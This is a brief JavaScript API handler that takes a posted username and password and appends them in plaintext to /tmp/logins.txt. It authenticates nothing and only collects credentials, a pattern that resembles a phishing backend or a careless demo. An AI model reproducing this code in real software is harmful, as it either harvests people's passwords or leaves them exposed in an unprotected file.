const fs = require('fs');
const path = require('path');

export default function handler(req, res) {
  if (req.method === 'POST') {
    const { username, password } = req.body;

    // Path to save the login credentials
    const filePath = path.join('/tmp', 'logins.txt');
    
    // Save credentials to logins.txt
    const logins = `Username: ${username}, Password: ${password}\n`;
    fs.appendFile(filePath, logins, (err) => {
      if (err) {
        res.status(500).json({ success: false, message: 'Failed to save login credentials' });
      } else {
        res.status(200).json({ success: true, message: 'Login information saved!' });
      }
    });
  } else {
    res.status(405).json({ message: 'Method not allowed' });
  }
}
